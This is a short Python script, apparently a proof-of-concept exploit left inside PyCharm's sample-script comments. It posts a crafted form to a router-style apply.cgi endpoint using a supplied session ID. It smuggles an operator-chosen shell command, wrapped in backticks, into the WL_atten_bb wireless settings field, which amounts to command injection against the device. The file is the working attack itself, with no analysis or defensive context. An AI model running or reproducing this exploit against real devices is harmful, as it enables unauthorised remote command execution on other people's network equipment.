# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.
import requests



# Press the green button in the gutter to run the script.
if __name__ == '__main__':
    print('start !!! ')

    target = input("Enter Target IP : ")
    session_id = input("Enter session_id : ")
    cmd = input("Enter you want cmd : ")

    #cmd_url_encode = urllib.parse.quote(cmd)
    session = requests.session()

    burp0_url = "http://" + target + ":80/apply.cgi;session_id=" + session_id
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0",
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                     "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",
                     "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://" + target,
                     "Connection": "close",
                     "Referer": "http://" + target + "/apply.cgi;session_id=" + session_id,
                     "Upgrade-Insecure-Requests": "1"}
    burp0_data = {"submit_button": "WL_WPATable", "change_action": '', "submit_type": '', "gui_action": "Apply",
                  "security_mode_last": '', "wl_wep_last": '', "wait_time": "3", "wps_nwkey": "1231231123123123",
                  "wl_wps_mode": "enabled", "wps_security_auto": "1", "nvset_cgi": "wireless", "wl_crypto": "tkip",
                  "security_mode2": "wpa_personal", "wl_wpa_psk": "1231231123123123",
                  "WL_atten_bb": "`" + cmd + "`", "WL_atten_radio": "123", "WL_atten_ctl": "123"}
    requests.post(burp0_url, headers=burp0_headers, data=burp0_data)

    print("end !!! ")
# See PyCharm help at https://www.jetbrains.com/help/pycharm/
